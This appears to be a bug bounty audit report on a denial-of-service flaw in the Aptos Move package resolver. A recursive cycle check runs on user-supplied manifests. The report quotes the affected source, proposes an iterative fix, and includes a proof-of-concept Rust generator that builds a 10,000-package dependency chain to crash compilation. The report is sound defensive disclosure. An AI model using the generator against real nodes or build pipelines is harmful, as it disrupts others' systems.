# Audit Report

## Title
Resource Exhaustion in Package Dependency Resolution via Recursive Cycle Detection

## Summary
The `ResolutionGraph::new()` function in the Move package system uses a recursive cycle detection algorithm (`is_cyclic_directed`) that is called repeatedly during graph construction. An attacker can craft malicious package manifests with deep dependency chains or complex cross-dependency patterns to cause stack overflow or CPU exhaustion on nodes attempting to compile these packages.

## Finding Description

The vulnerability exists in the package dependency resolution mechanism used when compiling Move packages. [1](#0-0) 

The `get_or_add_node()` function calls `algo::is_cyclic_directed(&self.graph)` every time it encounters a package node that already exists in the dependency graph. This function uses a **recursive** depth-first search implementation, as confirmed by the codebase's own security comment: [2](#0-1) 

The bytecode verifier explicitly avoids `is_cyclic_directed` for untrusted data, yet the package resolver uses it when processing user-supplied package manifests.

**Attack Path:**

1. Attacker creates a malicious `Move.toml` manifest with either:
   - **Deep chain attack**: Package A depends on B, B on C, ... creating a chain of 10,000+ packages
   - **Wide graph attack**: Multiple packages with many cross-dependencies to common libraries
   
2. The victim (validator node or developer) attempts to compile the malicious package by calling `resolution_graph_for_package()` [3](#0-2) 

3. During graph construction, `get_or_add_node()` is called for each dependency edge [4](#0-3) 

4. Each time an existing node is referenced, the recursive `is_cyclic_directed` runs on the entire graph, leading to:
   - **Stack overflow** with deep dependency chains (exceeding Rust's ~2MB default stack)
   - **CPU exhaustion** with wide graphs due to O(N × (V+E)) complexity where N is the number of dependency references

This breaks **Invariant #9 (Resource Limits)**: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This vulnerability qualifies as **Medium Severity** under the Aptos Bug Bounty program criteria:

- **Validator node slowdowns**: Complex dependency graphs cause excessive CPU usage during package compilation
- **Node crashes**: Deep dependency chains trigger stack overflow, crashing the compilation process
- **Availability impact**: Validators attempting to compile malicious packages become unresponsive

While this doesn't directly affect consensus or cause fund loss, it creates a denial-of-service vector against validator nodes that compile Move packages (e.g., during governance proposals to deploy new modules or when validators update their node software with new Move code).

The impact is limited compared to Critical/High severity issues because:
- It requires the target to actively attempt compilation of the malicious package
- It doesn't affect already-running blockchain operations
- Recovery is possible by killing and restarting the compilation process

## Likelihood Explanation

**Likelihood: Medium-High**

The attack is highly feasible because:

1. **No authentication required**: Anyone can create and distribute Move packages with malicious manifests
2. **Simple to exploit**: Creating a deep/wide dependency graph requires only editing a `Move.toml` file
3. **Common operation**: Package compilation happens during:
   - Governance proposals to deploy Move modules
   - Validator node upgrades
   - Developer tooling operations
4. **No rate limiting**: There are no limits on dependency graph size or depth [5](#0-4) 

The likelihood is not "High" only because the attack requires the victim to actively compile the malicious package, rather than being triggered automatically.

## Recommendation

Replace the recursive `algo::is_cyclic_directed` with an iterative algorithm. Follow the same pattern used in the struct definition verifier:

**Current vulnerable code:** [6](#0-5) 

**Recommended fix:**

1. Move cycle detection to AFTER graph construction (like the newer package resolver does) [7](#0-6) 

2. Use `petgraph::algo::toposort` (iterative) instead of `is_cyclic_directed` (recursive):

```rust
fn get_or_add_node(&mut self, package_name: PackageName) -> Result<GraphIndex> {
    if self.graph.contains_node(package_name) {
        Ok(package_name)
    } else {
        Ok(self.graph.add_node(package_name))
    }
}

// Add new function called once after graph construction:
fn check_for_cycles(&self) -> Result<()> {
    // toposort is iterative, safer for untrusted data
    match petgraph::algo::toposort(&self.graph, None) {
        Ok(_) => Ok(()),
        Err(cycle) => {
            let cycle_node = cycle.node_id();
            let mut scc = petgraph::algo::kosaraju_scc(&self.graph)[0]
                .iter()
                .map(|node| node.as_str().to_string())
                .collect::<Vec<_>>();
            scc.push(cycle_node.as_str().to_string());
            bail!("Found cycle between packages: {}", scc.join(" -> "))
        }
    }
}
```

3. Add depth/size limits as additional safeguards:
```rust
const MAX_DEPENDENCY_DEPTH: usize = 100;
const MAX_TOTAL_PACKAGES: usize = 1000;
```

## Proof of Concept

**Malicious Move.toml Generator:**

```rust
// Generate a deep dependency chain to cause stack overflow
use std::fs;
use std::path::Path;

fn create_malicious_package_chain(depth: usize) {
    for i in 0..depth {
        let dir = format!("malicious_pkg_{}", i);
        fs::create_dir_all(&dir).unwrap();
        
        let mut manifest = format!(
            "[package]\nname = \"Pkg{}\"\nversion = \"0.0.1\"\n\n[dependencies]\n",
            i
        );
        
        // Each package depends on the next
        if i < depth - 1 {
            manifest.push_str(&format!(
                "Pkg{} = {{ local = \"../malicious_pkg_{}\" }}\n",
                i + 1,
                i + 1
            ));
        }
        
        fs::write(
            Path::new(&dir).join("Move.toml"),
            manifest
        ).unwrap();
        
        // Create minimal sources directory
        fs::create_dir_all(Path::new(&dir).join("sources")).unwrap();
        fs::write(
            Path::new(&dir).join("sources").join("empty.move"),
            "module Pkg::M {}"
        ).unwrap();
    }
}

fn main() {
    // Create 10,000 packages in a chain to trigger stack overflow
    create_malicious_package_chain(10000);
    
    println!("Malicious package chain created.");
    println!("Try: cd malicious_pkg_0 && aptos move compile");
    println!("Expected: Stack overflow or excessive CPU usage");
}
```

**Reproduction Steps:**

1. Run the PoC generator to create the malicious package chain
2. Attempt to compile: `cd malicious_pkg_0 && aptos move compile`
3. Observe either:
   - Stack overflow crash (with deep chains ~10,000+)
   - Excessive CPU usage and timeout (with wide graphs of ~1,000 packages with many cross-refs)

The vulnerability triggers during the `resolution_graph_for_package()` call when processing the recursive dependency chain.

---

**Notes:**

This vulnerability is similar to CVE-2018-1000119 (Rack gem) and CVE-2022-24999 (qs library) where recursive algorithms on untrusted data caused DoS through stack exhaustion. The Aptos codebase already recognized this pattern and avoided it in the bytecode verifier, but the same issue exists in the package resolver.

### Citations

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L211-319)
```rust
    fn build_resolution_graph<W: Write>(
        &mut self,
        package: SourceManifest,
        package_path: PathBuf,
        is_root_package: bool,
        override_std: &Option<StdVersion>,
        writer: &mut W,
    ) -> Result<()> {
        let package_name = package.package.name;
        let package_node_id = match self.package_table.get(&package_name) {
            None => self.get_or_add_node(package_name)?,
            // Same package and we've already resolved it: OK, return early
            Some(other) if other.source_package == package => return Ok(()),
            // Different packages, with same name: Not OK
            Some(other) => {
                bail!(
                    "Conflicting dependencies found: package '{}' conflicts with '{}'",
                    other.source_package.package.name,
                    package.package.name,
                )
            },
        };

        let mut resolution_table = self
            .build_options
            .additional_named_addresses
            .clone()
            .into_keys()
            .map(|name| {
                let named_address = NamedAddress::from(name);

                // Fetch the additional named addresses.
                //
                // Notice that these addresses should already exist in the global pool, and
                // we are performing an Rc::clone here as opposed to a deep clone. This is
                // to ensure identical named addresses share the same Rc instance.
                let resolving_named_address = self
                    .global_named_address_pool
                    .get(&named_address)
                    .expect("should be able to get additional named addresses -- they are created during graph initialization")
                    .clone();
                (named_address, resolving_named_address)
            })
            .collect();

        // include dev dependencies if in dev mode
        let additional_deps = if self.build_options.dev_mode {
            package.dev_dependencies.clone()
        } else {
            BTreeMap::new()
        };

        for (dep_name, mut dep) in package
            .dependencies
            .clone()
            .into_iter()
            .chain(additional_deps.into_iter())
        {
            if let Some(std_version) = &override_std {
                if let Some(std_lib) = StdLib::from_package_name(dep_name) {
                    dep = std_lib.dependency(std_version);
                }
            }
            let dep_node_id = self.get_or_add_node(dep_name).with_context(|| {
                format!(
                    "Cycle between packages {} and {} found",
                    package_name, dep_name
                )
            })?;
            self.graph.add_edge(package_node_id, dep_node_id, ());

            let dep_resolution_table = self
                .process_dependency(dep_name, dep, package_path.clone(), override_std, writer)
                .with_context(|| {
                    format!(
                        "While resolving dependency '{}' in package '{}'",
                        dep_name, package_name
                    )
                })?;

            ResolutionPackage::extend_resolution_table(
                &mut resolution_table,
                &dep_name,
                dep_resolution_table,
            )
            .with_context(|| {
                format!(
                    "Resolving named addresses for dependency '{}' in package '{}'",
                    dep_name, package_name
                )
            })?;
        }

        self.unify_addresses_in_package(&package, &mut resolution_table, is_root_package)?;

        let source_digest =
            ResolvingPackage::get_package_digest_for_config(&package_path, &self.build_options)?;

        let resolved_package = ResolutionPackage {
            resolution_graph_index: package_node_id,
            source_package: package,
            package_path,
            resolution_table,
            source_digest,
        };

        self.package_table.insert(package_name, resolved_package);
        Ok(())
    }
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L480-497)
```rust
    fn get_or_add_node(&mut self, package_name: PackageName) -> Result<GraphIndex> {
        if self.graph.contains_node(package_name) {
            // If we encounter a node that we've already added we should check for cycles
            if algo::is_cyclic_directed(&self.graph) {
                // get the first cycle. Exists because we found a cycle above.
                let mut cycle = algo::kosaraju_scc(&self.graph)[0]
                    .iter()
                    .map(|node| node.as_str().to_string())
                    .collect::<Vec<_>>();
                // Add offending node at end to complete the cycle for display
                cycle.push(package_name.as_str().to_string());
                bail!("Found cycle between packages: {}", cycle.join(" -> "));
            }
            Ok(package_name)
        } else {
            Ok(self.graph.add_node(package_name))
        }
    }
```

**File:** third_party/move/move-bytecode-verifier/src/struct_defs.rs (L36-37)
```rust
        // toposort is iterative while petgraph::algo::is_cyclic_directed is recursive. Prefer
        // the iterative solution here as this code may be dealing with untrusted data.
```

**File:** third_party/move/tools/move-package/src/lib.rs (L203-222)
```rust
    pub fn resolution_graph_for_package<W: Write>(
        mut self,
        path: &Path,
        writer: &mut W,
    ) -> Result<ResolvedGraph> {
        if self.test_mode {
            self.dev_mode = true;
        }
        let path = SourcePackageLayout::try_find_root(path)?;
        let toml_manifest =
            self.parse_toml_manifest(path.join(SourcePackageLayout::Manifest.path()))?;
        let mutx = PackageLock::lock();
        // This should be locked as it inspects the environment for `MOVE_HOME` which could
        // possibly be set by a different process in parallel.
        let manifest = manifest_parser::parse_source_manifest(toml_manifest)?;
        let resolution_graph = ResolutionGraph::new(manifest, path, self, writer)?;
        let ret = resolution_graph.resolve();
        mutx.unlock();
        ret
    }
```

**File:** third_party/move/tools/move-package-resolver/src/resolver.rs (L170-173)
```rust
    check_for_name_conflicts(&graph)?;
    check_for_self_dependencies(&graph)?;
    check_for_cyclic_dependencies(&graph)?;

```
